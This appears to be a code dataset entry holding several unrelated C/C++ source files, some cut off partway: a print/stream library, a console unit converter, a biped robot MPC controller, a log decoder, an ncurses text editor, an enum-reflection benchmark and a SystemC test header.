    "#include <stdlib.h>\n#include <cstdio>\n#include <cstring>\n#include <math.h>\n#include <stdarg.h>\n\n#include \"OutputStream.h\"\n\n// Public Methods //////////////////////////////////////////////////////////////\n\n/* default implementation: may be overridden */\nusing namespace data_device;\nsize_t OutputStream::print(const String &s)\n{\n  return write(s.c_str(), s.length());\n}\n\nsize_t OutputStream::print(const char str[],...)\n{\n    va_list ap;\n    uint16_t len;\n    va_start(ap, str);\n    vsprintf((char *)tx_Buff, str, ap);\n    va_end(ap);\n    return write(tx_Buff);\n}\n\nsize_t OutputStream::print(char c)\n{\n  return write(c);\n}\n\nsize_t OutputStream::print(unsigned char b, int base)\n{\n  return print((unsigned long long)b, base);\n}\n\nsize_t OutputStream::print(int n, int base)\n{\n  return print((long long)n, base);\n}\n\nsize_t OutputStream::print(unsigned int n, int base)\n{\n  return print((unsigned long long)n, base);\n}\n\nsize_t OutputStream::print(long long n, int base)\n{\n  if (base == 0)\n  {\n    return write(n);\n  }\n  else if (base == 10)\n  {\n    if (n < 0)\n    {\n      int t = print('-');\n      n = -n;\n      return printNumber(n, 10) + t;\n    }\n    return printNumber(n, 10);\n  }\n  else\n  {\n    return printNumber(n, base);\n  }\n}\n\nsize_t OutputStream::print(unsigned long long n, int base)\n{\n  if (base == 0)\n    return write(n);\n  else\n    return printNumber(n, base);\n}\n\nsize_t OutputStream::print(double n, int digits)\n{\n  return printFloat(n, digits);\n}\n\nsize_t OutputStream::println(const String &s)\n{\n  size_t n = print(s);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(const char c[],...)\n{\n    va_list ap;\n    uint16_t len;\n    va_start(ap, c);\n    vsprintf((char *)tx_Buff, c, ap);\n    va_end(ap);\n  size_t n = print(tx_Buff);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(char c)\n{\n  size_t n = print(c);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(unsigned char b, int base)\n{\n  size_t n = print(b, base);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(int num, int base)\n{\n  size_t n = print(num, base);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(unsigned int num, int base)\n{\n  size_t n = print(num, base);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(long long num, int base)\n{\n  size_t n = print(num, base);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(unsigned long long num, int base)\n{\n  size_t n = print(num, base);\n  n += println();\n  return n;\n}\n\nsize_t OutputStream::println(double num, int digits)\n{\n  size_t n = print(num, digits);\n  n += println();\n  return n;\n}\n\n// Private Methods /////////////////////////////////////////////////////////////\n\nsize_t OutputStream::printNumber(unsigned long n, uint8_t base)\n{\n  char buf[8 * sizeof(long) + 1]; // Assumes 8-bit chars plus zero byte.\n  char *str = &buf[sizeof(buf) - 1];\n\n  *str = '\\0';\n\n  // prevent crash if called with base == 1\n  if (base < 2)\n    base = 10;\n\n  do\n  {\n    char c = n % base;\n    n /= base;\n\n    *--str = c < 10 ? c + '0' : c + 'A' - 10;\n  } while (n);\n\n  return write(str);\n}\n\nsize_t OutputStream::printFloat(double number, uint8_t digits)\n{\n  size_t n = 0;\n\n  if (isnan(number))\n    return print(\"nan\");\n  if (isinf(number))\n    return print(\"inf\");\n  if (number > 4294967040.0)\n    return print(\"ovf\"); // constant determined empirically\n  if (number < -4294967040.0)\n    return print(\"ovf\"); // constant determined empirically\n\n  // Handle negative numbers\n  if (number < 0.0)\n  {\n    n += print('-');\n    number = -number;\n  }\n\n  // Round correctly so that print(1.999, 2) prints as \"2.00\"\n  double rounding = 0.5;\n  for (uint8_t i = 0; i < digits; ++i)\n    rounding /= 10.0;\n\n  number += rounding;\n\n  // Extract the integer part of the number and print it\n  unsigned long long int_part = (unsigned long long)number;\n  double remainder = number - (double)int_part;\n  n += print(int_part);\n\n  // Print the decimal point, but only if there are digits beyond\n  if (digits > 0)\n  {\n    n += print('.');\n  }\n\n  // Extract digits from the remainder one at a time\n  while (digits-- > 0)\n  {\n    remainder *= 10.0;\n    unsigned int toPrint = (unsigned int)(remainder);\n    n += print(toPrint);\n    remainder -= toPrint;\n  }\n\n  return n;\n}\n\n\n\n\n\n\n\n",
    "#include<iostream>\r\n#include<cstring>\r\n#include<algorithm>\r\n#include<math.h>\r\n#include<windows.h>\r\nusing namespace std;\r\n\r\n//Decimal to Binary\r\nstring dectobin(int decno)\r\n{\r\n    int num=decno;\r\n\tstring bino=\"\";\r\n\t\r\n\twhile(decno>0){\r\n\t\tbino += char('0' + decno % 2);\r\n\t\tdecno /=2;\r\n\t}\r\n\treverse(bino.begin(),bino.end());\r\n\t\r\n\treturn bino;\r\n}\r\n\r\n//Decimal to Octal\r\nstring dectooc(int decno)\r\n{\r\n    int num=decno;\r\n\tstring octa=\"\";\r\n\t\r\n\twhile(decno>0){\r\n\t\tocta += char('0' + decno % 8);\r\n\t\tdecno /=8;\r\n\t}\r\n\treverse(octa.begin(),octa.end());\r\n\t\r\n\treturn octa;\r\n}\r\n//DEcimal to Hexadecimal\r\nstring dectohex(int decno)\r\n{\r\n    string hexa=\"\";\r\n    while(decno>0)\r\n    {\r\n        int rem = decno % 16;\r\n        if(rem < 10)\r\n            hexa = char('0' + rem) + hexa;\r\n        else\r\n            hexa = char('A' + rem - 10) + hexa;\r\n        decno /= 16;\r\n    }\r\n    return hexa;\r\n}\r\n\r\n//Binary to Decimal \r\nint binotodec(int bino)\r\n{\r\n   int num=bino;\r\n   if(bino==0){\r\n       return 0;\r\n   }\r\n   else{\r\n       return binotodec(bino/10)*2 + (bino%10);\r\n       }\r\n}\r\n\r\n//Octal to Decimal\r\nint octotodec(int octo){\r\n    int num=octo;\r\n    if(octo==0)\r\n    {\r\n        return 0;\r\n    }\r\n    else{\r\n        return octotodec(octo/10)*8 + (octo%10);\r\n    }\r\n}\r\n\r\n//hexadecimal to decimal\r\nint hextodec(string hexa)\r\n{\r\n    int num=hexa.length();\r\n    int decno = 0;\r\n    for(int i=0; i<num; i++)\r\n    {\r\n        if(hexa[i]>='0' && hexa[i]<='9')\r\n            decno = decno * 16 + hexa[i] - '0';\r\n        else if(hexa[i]>='A' && hexa[i]<='F')\r\n            decno = decno * 16 + hexa[i] - 'A' + 10;\r\n        else if(hexa[i]>='a' && hexa[i]<='f')\r\n            decno = decno * 16 + hexa[i] - 'a' + 10;\r\n    }\r\n    return decno;\r\n}\r\n\r\n//driver\r\nint main()\r\n{\r\n\tsystem(\"color 03\");\r\n    while(1)\r\n    {\r\n    \r\n\tint num, choice;\r\n\tfloat converted_value;\r\n\t    cout<<\"\\n*********************************************************\\n\";\r\n\t\tcout<<\"\\n****************** CONVERSION SYSTEM ********************\\n\";\r\n\t\tcout<<\"\\n*********************************************************\\n\";\r\n\t\tcout<<\"\\n**************** 1.Number Conversion ********************\\n\";\r\n\t\tcout<<\"\\n**************** 2.Length Conversion ********************\\n\";\r\n\t\tcout<<\"\\n********************** 3.EXIT ***************************\\n\";\r\n\t\tcout<<\"\\n*********************************************************\\n\";\r\n\t\tcout<<\"\\nEnter your choice:\";\r\n\t\tcin>>choice;\r\n\t\tif(choice>=3)\r\n\t\tbreak;\r\n\t\t\r\n\t\t   \r\n\t\tswitch(choice)\r\n\t\t{\r\n\t\t    \r\n\t\t\tcase 1:\r\n\t\t\tchar o; \r\n\t\t\tcout<<\"\\n---------------------------------------------------------\";\r\n\t\t\tcout<<\"\\n****************** NUMBER CONVERSION ********************\";\r\n\t\t\tcout<<\"\\n---------------------------------------------------------\";\r\n\t\t\tcout<<\"\\nA.Decimal to binary\";\r\n\t\t\tcout<<\"\\nB.Decimal to Octal\";\r\n\t\t\tcout<<\"\\nC.Decimal to Hexadecimal\";\r\n\t\t\tcout<<\"\\nD.Binary to Decimal\";\r\n\t\t\tcout<<\"\\nE.Octal to Decimal\";\r\n\t\t\tcout<<\"\\nF.Hexadecimal to Decimal\";\r\n\t\t\tcout<<\"\\n---------------------------------------------------------\";\r\n\t\t\tcout<<\"\\nEnter the Option (choose lowercase):\";\r\n\t\t\tcin>>o;\r\n\t\t\tcout<<\"\\nEnter the number for conversion:\";\r\n\t\t\tcin>>num;\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tswitch(o)\r\n\t\t\t{\r\n\t\t\t\tcase 'a':\r\n\t\t\t\tcout<<\"\\nThe decimal of \"<<num<<\" in binary is \"<<dectobin(num);break;\r\n\t\t\t\t\r\n\t\t\t\tcase 'b':\r\n\t\t\t\tcout<<\"\\nThe Decimal of \"<<num<<\" in octal is \"<<dectooc(num);break;\r\n\t\t\t\t\r\n\t\t\t\tcase 'c':\r\n\t\t\t\tcout<<\"\\nThe decimal of \"<<num<<\" in hexadecimal is \"<<dectohex(num);break;\r\n\t\t\t\t\r\n\t\t\t\tcase 'd':\r\n\t\t\t\tcout<<\"\\nThe decimal of \"<<num<<\" in binary is \"<<binotodec(num);break;\r\n\t\t\t\t\r\n\t\t\t\tcase 'e':\r\n\t\t\t\tcout<<\"\\nThe Octal of \"<<num<<\" in decimal is \"<<octotodec(num);break;\r\n\t\t\t\t\r\n\t\t\t\tcase 'f':\r\n\t\t\t\t{\r\n\t\t\t\t\tstring hexa;\r\n\t\t\t\t\tcout<<\"\\nEnter the Hexadecimal number for conversion: \";\r\n\t\t\t\t\tcin>>hexa;\r\n\t\t\t\t\tcout<<\"\\nThe hexadecimal of \"<<hexa<<\" in decimal is \"<<hextodec(hexa);break;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tdefault:cout<<\"Invalid\";\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase 2:\r\n\t\t\t\tchar s;\r\n\t\t\t\tcout<<\"\\n---------------------------------------------------------\";\r\n\t\t\t\tcout<<\"\\n******************* LENGTH CONVERSION *******************\";\r\n\t\t\t\tcout<<\"\\n---------------------------------------------------------\";\r\n\t\t\t\tcout<<\"\\nA.Centimeter to Millimeter\";\r\n\t\t\t\tcout<<\"\\nB.Meter to Feet\";\r\n\t\t\t\tcout<<\"\\nC.Foot to Meter\";\r\n\t\t\t\tcout<<\"\\nD.Kilometer to Yard\";\r\n\t\t\t\tcout<<\"\\nE.Kilometer to Mile\";\r\n\t\t\t\tcout<<\"\\nF.Inch to Foot\";\r\n\t\t\t\tcout<<\"\\n---------------------------------------------------------\";\r\n\t\t\t\tcout<<\"\\nEnter the Option:\";\r\n\t\t\t\tcin>>s;\r\n\t\t\t\tcout<<\"\\nEnter the number for conversion:\";\r\n\t\t\t\tcin>>num;\r\n\t\t\t\t\r\n\t\t\t\tswitch(s)\r\n\t\t\t\t{\r\n\t\t\t\t\tcase 'a': \r\n\t\t\t\t\tconverted_value=num*10;\r\n\t\t\t\t\tcout<<num<<\" Centimeter is \"<<converted_value<<\" Millimeter\";break;\r\n\t\t\t\t\t\r\n\t\t\t\t\tcase 'b': \r\n\t\t\t\t\tconverted_value=num*3.28084;\r\n\t\t\t\t\tcout<<num<<\" Meter is \"<<converted_value<<\" Feet\";break;\r\n\t\t\t\t\t\r\n\t\t\t\t\tcase 'c': \r\n\t\t\t\t\tconverted_value=num/3.28084;\r\n\t\t\t\t\tcout<<num<<\" Feet is \"<<converted_value<<\" Meter\";break;\r\n\t\t\t\t\t\r\n\t\t\t\t\tcase 'd':\r\n\t\t\t\t\tconverted_valu",
    "#include <iostream>\n#include \"../include/common/Utilities/Timer.h\"\n#include \"../include/common/Math/orientation_tools.h\"\n#include \"ConvexMPCLocomotion.h\"\n#include \"convexMPC_interface.h\"\n\nusing namespace ori;\nusing Eigen::Dynamic;\n#include <ros/ros.h>\n/* =========================== Controller ============================= */\nConvexMPCLocomotion::ConvexMPCLocomotion(double _dt, int _iterations_between_mpc) : iterationsBetweenMPC(_iterations_between_mpc),\n                                                                                    horizonLength(10),\n                                                                                    dt(_dt),\n                                                                                    walking(horizonLength, Vec2<int>(0, 5), Vec2<int>(5, 5), \"Walking\"),\n                                                                                    standing(horizonLength, Vec2<int>(0, 0), Vec2<int>(10, 10), \"Standing\")\n{\n  hight = 0.35;\n  gaitNumber = 1;\n  dtMPC = dt * iterationsBetweenMPC;\n  rpy_int[2] = 0;\n  for (int i = 0; i < 2; i++)\n    firstSwing[i] = true;\n  ros::param::get(\"ConvexMPCLocomotion/run/Kp\", Kp_param);\n  std::cout<<\"ConvexMPCLocomotion/run/Kp:\"<<Kp_param<<std::endl;\n  ros::param::get(\"ConvexMPCLocomotion/run/Kd\", Kd_param);\n  std::cout<<\"ConvexMPCLocomotion/run/Kd:\"<<Kd_param<<std::endl;\n  ros::param::get(\"ConvexMPCLocomotion/run/kptoe\", Kptoe_param);\n  std::cout<<\"ConvexMPCLocomotion/run/kptoe:\"<<Kptoe_param<<std::endl;\n  ros::param::get(\"ConvexMPCLocomotion/run/kdtoe\", Kdtoe_param);\n  std::cout<<\"ConvexMPCLocomotion/run/kdtoe:\"<<Kdtoe_param<<std::endl;\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_roll\", Q_roll);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_pitch\", Q_pitch);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_yaw\", Q_yaw);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_x\", Q_x);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_y\", Q_y);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_z\", Q_z);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_droll\", Q_droll);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_dpitch\", Q_dpitch);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_dyaw\", Q_dyaw);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_dx\", Q_dx);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_dy\", Q_dy);\n  ros::param::get(\"ConvexMPCLocomotion/run/Q_dz\", Q_dz);\n  ros::param::get(\"ConvexMPCLocomotion/run/swing_hight\", swing_hight);\n  ros::param::get(\"ConvexMPCLocomotion/run/first_hight\", first_hight);\n  \n}\n\n/******************************************************************************************************/\n/******************************************************************************************************/\n\nvoid ConvexMPCLocomotion::run(ControlFSMData &data)\n{\n  bool omniMode = false;\n\n  auto &seResult = data._stateEstimator->getResult();\n  // \u8fd4\u56deStateEstimatorData.result\u53d8\u91cf\uff0c\n  // \u8be5\u53d8\u91cf\u5728OrientationEstimator.cpp\u7684CheaterOrientationEstimator::run()\u8fdb\u884c\u66f4\u65b0\n  auto &stateCommand = data._desiredStateCommand;\n\n  // pick gait\n  Gait *gait = &standing;\n  if (gaitNumber == 1)\n    gait = &standing;\n  else if (gaitNumber == 2)\n    gait = &walking;\n\n  current_gait = gaitNumber;\n  // integrate position setpoint\n  Vec3<double> v_des_robot(stateCommand->data.stateDes[6], stateCommand->data.stateDes[7], 0);\n  // \u8bbe\u7f6e\u76ee\u6807\u901f\u5ea6\uff0cstateCommand->data.stateDes\u5728DesiredCommand::setStateCommands\u4e2d\u66f4\u65b0\uff0c\n  // \u8be5\u51fd\u6570\u5728FSMState_Walking::run\u4e2d\u8c03\u7528\n\n  // \u673a\u5668\u4eba\u76f8\u5bf9\u4e8e\u4e16\u754c\u7684\u901f\u5ea6\n  Vec3<double> v_des_world;\n\n  v_des_world = seResult.rBody.transpose() * v_des_robot;\n  // rBody\u4e58v_des_robot\u5f97\u5230\u673a\u5668\u4eba\u76f8\u5bf9\u4e8e\u4e16\u754c\u7684\u901f\u5ea6\n  Vec3<double> v_robot = seResult.vWorld;\n  // seResult.vWorld\u5728PositonVelocityEstimator.cpp\u7684CheaterPositionVelocityEstimator::run()\u8fdb\u884c\u66f4\u65b0\n  // \u6570\u636e\u6e90\u81ea\u4e8eCheatIO::StateCallback\uff0c\u4ecegazebo\u5f97\u5230\u5173\u4e8e\u673a\u5668\u4eba\u7684\u7ebf\u901f\u5ea6msg\n  // \u5728\u5b9e\u4f53\u673a\u4e2d\uff0c\u8fd9\u4e2a\u7ebf\u901f\u5ea6\uff0c\u9700\u8981\u4e00\u4e2a\u91cc\u7a0b\u8ba1\uff0c\u7b80\u5355\u64cd\u4f5c\u662f\u5bf9imu\u7684\u52a0\u901f\u5ea6\u8fdb\u884c\u79ef\u5206\u7136\u540e\u4f7f\u7528\u5361\u5c14\u66fc\u8fdb\u884c\u89c2\u6d4b\n  // \u590d\u6742\u64cd\u4f5c\u662f\u4eceLIO\u6216VIO\u62ff\u5230\u91cc\u7a0b\u8ba1\u6570\u636e\n  world_position_desired[0] += dt * v_des_world[0];\n  world_position_desired[1] += dt * v_des_world[1];\n  world_position_desired[2] = hight;\n  // \u8fd9\u662f\u5bf9\u673a\u5668\u4eba\u7684\u8d28\u5fc3\u7684\u9ad8\u5ea6\u7684\u9700\u6c42\uff0c\u662f\u673a\u5668\u4eba\u521d\u59cb\u72b6\u6001\u817f\u90e8\u5f2f\u66f2\u4e14\u9759\u6b62\u7684\u9ad8\u5ea6\n\n  // get then foot location in world frame\n  for (int i = 0; i < 2; i++)\n  {\n    pFoot[i] = seResult.position +\n               // seResult.position\u662f\u5728PositonVelocityEstimator.cpp\u7684CheaterPositionVelocityEstimator::run()\u8fdb\u884c\u66f4\u65b0\uff0c\n               // \u6570\u636e\u6e90\u81ea\u4e8eCheatIO::StateCallback\uff0c\u4ecegazebo\u5f97\u5230\u5173\u4e8e\u673a\u5668\u4eba\u7684\u4f4d\u7f6emsg\n               // \u5b9e\u9645\u5e94\u8be5\u662fbaselink\u76f8\u5bf9\u4e8e\u4e16\u754c\u5750\u6807\u7cfb\u7684\u4f4d\u7f6e\n               // \u540cseResult.vWorld\uff0c\u5728\u5b9e\u673a\u4e2d\u5e94\u8be5\u4eceVIO\u6216LIO\u83b7\u53d6\n               seResult.rBody.transpose() * (data._biped->getHip2Location(i) + data._legController->data[i].p);\n    // data._biped->getHip2Location(i)\u8fd4\u56de\u7684\u662fHip2\u5173\u8282\u7684\u504f\u79fb\u5411\u91cf\uff0c\u51fd\u6570\u5728Biped.h\u4e2d\u5b9a\u4e49\n    // \u51fd\u6570\u7528\u5230\u7684leg_offset_**\u9700\u8981\u6839\u636e\u4ee5\u8d28\u5fc3\u5750\u6807\u7cfb\u4e3a\u53c2\u8003\uff0c\u8d28\u5fc3\u5230hip2\u5173\u8282\u7684\u504f\u79fb\u6765\u586b\u5199\u3002\n    // \u5047\u5982\u8d28\u5fc3\u5c31\u662fbaselink\uff0c\u800chip\u5230baselink\u5728x\u65b9\u5411\u6ca1\u6709\u504f\u79fb\uff0c\u5e76\u4e14calf\u548cthigh\u5173\u8282\u8f74\u7ebf\u4e0ehip\u8f74\u7ebf\u5171\u9762\n    // \u90a3\u4e48leg_offset_x2=0.0\uff0c\u90a3\u4e48 leg_offset_y2 \u4e3ay\u8f74baselink\u5230hip2\u5173\u8282\u8f74\u7ebf\u7684\u8ddd\u79bb\uff0cleg_offset_z2\u540c\u7406\n    // data._legController->data[i].p \u6765\u81ea\u4e8e LegController.h \u7684LegControllerData\u7ed3\u6784\u4f53\n    // p\u662f\u4e09\u8f74\u4f4d\u7f6e\n    // pFoot\u662f\u8ba1\u7b97\u9acb\u5173\u8282\u5230\u4e16\u754c\u5750\u6807\u7cfb\u7684\u4f4d\u7f6e\n    std::cout << \"Foot\" << i << \" \" << pFoot[i] << \"  \" << std::endl;\n  }\n  std::cout << std::endl;\n  // some first",
    "\ufeff/*\n * Copyright (C) 2024 THL A29 Limited, a Tencent company.\n * BQLOG is licensed under the Apache License, Version 2.0.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n */\n#include <string.h>\n#include \"bq_log/log/decoder/appender_decoder_raw.h\"\n#include \"bq_log/log/appender/appender_file_raw.h\"\n\nbq::appender_decode_result bq::appender_decoder_raw::init_private()\n{\n    return appender_decode_result::success;\n}\n\nbq::appender_decode_result bq::appender_decoder_raw::decode_private()\n{\n    decoded_text_.clear();\n    auto read_handle = read_with_cache(sizeof(uint32_t));\n    if (read_handle.len() == 0) {\n        return appender_decode_result::eof;\n    }\n    if (read_handle.len() != sizeof(uint32_t)) {\n        bq::util::log_device_console(log_level::error, \"decode raw log file failed, read item size failed\");\n        return appender_decode_result::failed_io_error;\n    }\n    uint32_t item_size = *(uint32_t*)read_handle.data();\n    read_handle = read_with_cache(item_size);\n    if (read_handle.len() < (size_t)item_size) {\n        bq::util::log_device_console(log_level::error, \"decode raw log file failed, read item failed, need read size:%d\", item_size);\n        return appender_decode_result::failed_io_error;\n    }\n    bq::log_entry_handle item(read_handle.data(), item_size);\n    return do_decode_by_log_entry_handle(item);\n}\n\nuint32_t bq::appender_decoder_raw::get_binary_format_version() const\n{\n    return appender_file_raw::format_version;\n}\n",
    "#include <algorithm>\n#include <csignal>\n#include <cstring>\n#include <fstream>\n#include <iostream>\n#include <ncurses.h>\n#include <unistd.h>\n#include <vector>\n\n#define KEY_ESC 27\n#define REG_COLOR_NUM 1\n#define CUS_COLOR_NUM 1\n#define TAB_SIZE 4\n\nenum EditorMode { NORMAL, INSERT, COMMAND };\nenum WrapMode { BREAK, SCROLL };\n\nclass MiniVim {\npublic:\n  MiniVim(const std::string &filename, bool truncate, bool readOnly,\n          WrapMode wrapMode)\n      : filename(filename), truncate(truncate), readOnly(readOnly),\n        wrapMode(wrapMode) {\n    initscr();                    // Start ncurses mode\n    raw();                        // Line buffering disabled\n    keypad(stdscr, true);         // We get F1, F2, etc.\n    noecho();                     // Don't echo while we do getch\n    curs_set(1);                  // Make cursor visible\n    getmaxyx(stdscr, rows, cols); // Get screen size\n\n    if (rows <= 3) {\n      fprintf(stderr, \"Window is too small to display the content\");\n      endwin();\n      exit(1);\n    }\n\n    // init color\n    // start_color();\n    // init_pair(CUS_COLOR_NUM, COLOR_YELLOW, COLOR_CYAN);\n\n    wrefresh(stdscr);\n\n    fileWindow = newwin(rows - 2, cols, 0, 0);\n    // wbkgd(fileWindow, CUS_COLOR_NUM);\n    wrefresh(fileWindow);\n\n    infoWindow = newwin(1, cols, rows - 2, 0);\n    // wbkgd(infoWindow, CUS_COLOR_NUM);\n    wrefresh(infoWindow);\n\n    commandWindow = newwin(1, cols, rows - 1, 0);\n    wrefresh(commandWindow);\n\n    cursorY = cursorX = 0;\n    editorMode = NORMAL;\n\n    loadFile();\n  }\n\n  ~MiniVim() {\n    endwin(); // End ncurses mode\n  }\n\n  void run() {\n    refreshScreen();\n\n    int ch;\n    while (ch = wgetch(stdscr)) {\n      warnMessage = \"\";\n      switch (editorMode) {\n      case NORMAL:\n        handleNormalEditorMode(ch);\n        break;\n      case INSERT:\n        handleInsertEditorMode(ch);\n        break;\n      case COMMAND:\n        handleCommandEditorMode(ch);\n        break;\n      default:\n        break;\n      }\n      autoScroll();\n      refreshScreen();\n    }\n  }\n\nprivate:\n  WINDOW *fileWindow;\n  WINDOW *infoWindow;\n  WINDOW *commandWindow;\n\n  EditorMode editorMode;\n\n  std::string filename;\n  bool truncate;\n  bool readOnly;\n  bool isNewFile;\n  bool modified;\n  WrapMode wrapMode;\n\n  int cursorY, cursorX;\n  int rows, cols;\n  int startLine;\n\n  char kbCache = '\\0';\n\n  std::string warnMessage;\n\n  std::vector<std::string> buffer;\n  std::string commandBuffer;\n\n  void loadFile() {\n    if (truncate) {\n      buffer.push_back(\"\"); // Start with an empty buffer if truncating\n      return;\n    }\n\n    std::ifstream file(filename);\n    if (file.is_open()) {\n      std::string line;\n      while (std::getline(file, line)) {\n        buffer.push_back(line);\n      }\n      file.close();\n      isNewFile = false;\n    } else {\n      buffer.push_back(\"\");\n      isNewFile = true;\n      // Initialize with one empty line if file cannot be opened\n    }\n\n    modified = false;\n  }\n\n  void saveFile() {\n    std::ofstream file(filename);\n    if (file.is_open()) {\n      for (const auto &line : buffer) {\n        file << line << std::endl;\n      }\n      file.close();\n      modified = false;\n    } else {\n      warnMessage = \"Failed to save file!\";\n    }\n  }\n\n  void handleNormalEditorMode(int ch) {\n    switch (ch) {\n    case 'i':\n      if (readOnly) {\n        warnMessage = \"Readonly file cannot be edited.\";\n      } else {\n        editorMode = INSERT;\n      }\n      break;\n\n    case ':':\n      editorMode = COMMAND;\n      commandBuffer.clear();\n      break;\n\n    case KEY_UP:\n      if (cursorY + startLine > 0) {\n        --cursorY;\n        cursorX = std::min(\n            cursorX,\n            std::max(0, int(buffer[cursorY + startLine].length() - 1)));\n      }\n      break;\n\n    case KEY_DOWN:\n      if (cursorY + startLine < buffer.size() - 1) {\n        ++cursorY;\n        cursorX = std::min(\n            cursorX,\n            std::max(0, int(buffer[cursorY + startLine].length() - 1)));\n      }\n      break;\n\n    case KEY_LEFT:\n      if (cursorX > 0) {\n        --cursorX;\n      } else if (cursorY + startLine > 0) {\n        --cursorY;\n        cursorX = buffer[cursorY + startLine].length() - 1;\n      }\n      break;\n\n    case 'b':\n      while (cursorX > 0 && buffer[cursorY + startLine][--cursorX] == ' ')\n        ;\n      if (cursorX == 0 && cursorY + startLine > 0) {\n        --cursorY;\n        cursorX = buffer[cursorY + startLine].length() - 1;\n      }\n      break;\n\n    case KEY_RIGHT:\n      if (cursorX < buffer[cursorY + startLine].length()) {\n        ++cursorX;\n      } else if (cursorY + startLine < buffer.size() - 1) {\n        ++cursorY;\n        cursorX = 0;\n      }\n      break;\n\n    case 'w':\n      while (cursorX < buffer[cursorY + startLine].length() - 1 &&\n             buffer[cursorY + startLine][++cursorX] == ' ')\n        ;\n      if (cursorX == buffer[cursorY + startLine].length() - 1 &&\n          cursorY + startLine < buffer.size() - 1) {\n        ++cursorY;\n        cursorX = 0;\n      }\n      break;\n\n    case '0':\n    case KEY_HOME:",
    "//-----------------------------------------------------------------------------------------\n// SPDX-License-Identifier: MIT\n// SPDX-FileCopyrightText: Copyright (C) 2024 Fix8 Market Technologies Pty Ltd\n// SPDX-FileType: SOURCE\n//\n// conjure_enum (header only)\n//   by David L. Dight\n// see https://github.com/fix8mt/conjure_enum\n//\n// Lightweight header-only C++20 enum and typename reflection\n//\n// Licensed under the MIT License <http://opensource.org/licenses/MIT>.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is furnished\n// to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice (including the next paragraph)\n// shall be included in all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,\n// INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A\n// PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n// HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n// OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n// SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n//----------------------------------------------------------------------------------------\n// call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat\"\n// cd build\n// cl /nologo /MD /std:c++latest /Bt+ /I _deps/magic_enum-src/include ../cbenchmark.cpp|find \"c1xx.dll\"\n//----------------------------------------------------------------------------------------\n#include <magic_enum/magic_enum.hpp>\n\n//-----------------------------------------------------------------------------------------\nenum class numbers\n{\n   zero, one, two, three, four,\n   five, six, seven, eight, nine,\n   ten, eleven, twelve, thirteen, fourteen,\n   fifteen, sixteen, seventeen, eighteen, nineteen,\n   twenty, twenty_one, twenty_two, twenty_three, twenty_four,\n   twenty_five, twenty_six, twenty_seven, twenty_eight, twenty_nine,\n   thirty, thirty_one, thirty_two, thirty_three, thirty_four,\n   thirty_five, thirty_six, thirty_seven, thirty_eight, thirty_nine,\n   forty, forty_one, forty_two, forty_three, forty_four,\n   forty_five, forty_six, forty_seven, forty_eight, forty_nine,\n   fifty, fifty_one, fifty_two, fifty_three, fifty_four,\n   fifty_five, fifty_six, fifty_seven, fifty_eight, fifty_nine,\n   sixty, sixty_one, sixty_two, sixty_three\n};\n\ntemplate<>\nstruct magic_enum::customize::enum_range<numbers>\n{ static constexpr int min{}, max{static_cast<int>(numbers::sixty_three)}; };\n\n//-----------------------------------------------------------------------------------------\nint test_magic_enum(numbers num)\n{\n\treturn magic_enum::enum_name(num).size();\n}\n\nint main(void)\n{\n\treturn 0;\n}\n",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  test02.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n 